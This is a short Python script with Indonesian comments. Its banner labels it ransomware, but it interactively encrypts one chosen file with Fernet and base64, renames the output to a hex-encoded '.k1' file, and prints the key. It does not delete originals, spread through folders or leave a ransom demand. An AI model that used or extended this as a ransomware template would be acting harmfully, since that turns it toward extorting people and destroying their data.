#!/usr/bin/python

# ============================
# = DEVELOPER  BY  K 1 L L U =
# ============================

# ============================
# +++ R A N S O M W A R E ++++
# ============================

# ============================
# =  K1-F64   VERSI   1.0.1  =
# ============================ 

# buat warna biar mantapz 
Bl='\033[30m'
Re='\033[1;31m'
Gr='\033[1;32m'
Ye='\033[1;33m'
Blu='\033[1;34m'
Mage='\033[1;35m'
Cy='\033[1;36m'
Wh='\033[1;37m'

#library buat enkripsi
from cryptography.fernet import Fernet as fr 
from k1genkey import generate_kunci 
from base64 import b64encode as b64e
from binascii import hexlify as hx

#baca konci dolo
def baca_konci():
    return open("konci.k1", 'rb').read()

#enkripsi data menggnunakan konci
def enkripsi_data(filemu):
    kunci_enc = baca_konci()
    enkripsi_data = fr(kunci_enc)
    
    #baca file yang ingin di enkripsi
    with open(filemu, 'rb') as enkripsi:
        hasil_en = enkripsi.read()
    
    #enkripsi dulu menggunakan fernet
    enkripsi_data_file = enkripsi_data.encrypt(hasil_en)
    #enkripsi kembali data menggunakan base64
    enkripsi_data_file2 = b64e(enkripsi_data_file)
    
    #ubah filename pake fungsi hexlify
    ubah_filename = hx(filemu.encode('utf-8')).decode('utf-8')
    
    #simpan file enkripsi
    with open(ubah_filename + ".k1", 'wb') as data:
        data.write(enkripsi_data_file2)

    return ubah_filename
print(f"""{Cy}
      
██╗░░██╗░░███╗░░███████╗░█████╗░░░██╗██╗  ███████╗░█████╗░██████╗░██╗░░░██╗██████╗░████████╗
██║░██╔╝░████║░░██╔════╝██╔═══╝░░██╔╝██║  ██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝
█████═╝░██╔██║░░█████╗░░██████╗░██╔╝░██║  █████╗░░██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░
██╔═██╗░╚═╝██║░░██╔══╝░░██╔══██╗███████║  ██╔══╝░░██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░
██║░╚██╗███████╗██║░░░░░╚█████╔╝╚════██║  ███████╗╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░
╚═╝░░╚═╝╚══════╝╚═╝░░░░░░╚════╝░░░░░░╚═╝  ╚══════╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░

                     {Wh}- {Cy}TOOLS ENCRYPT FILE YANG DI BUAT OLEH K1LLU {Wh}-
                                    {Wh}- {Re}VERSI 1.0.1 {Wh}- 
""")
filemu = input(f"{Wh}[{Re}+{Wh}] {Cy}Masukan File Mu bro! {Wh}:  ")
print(f"{Wh}[{Re}+{Wh}] {Cy}Kunci Encrypt {Wh}: {Re}{baca_konci()} {Wh}tersimpan di {Cy}konci.k1!")

ubah_filname = enkripsi_data(filemu)
print(f"{Wh}[{Re}+{Wh}] {Cy}Hasil Enkripsi {Re}{filemu} {Wh}: {Cy}{ubah_filname}.k1")

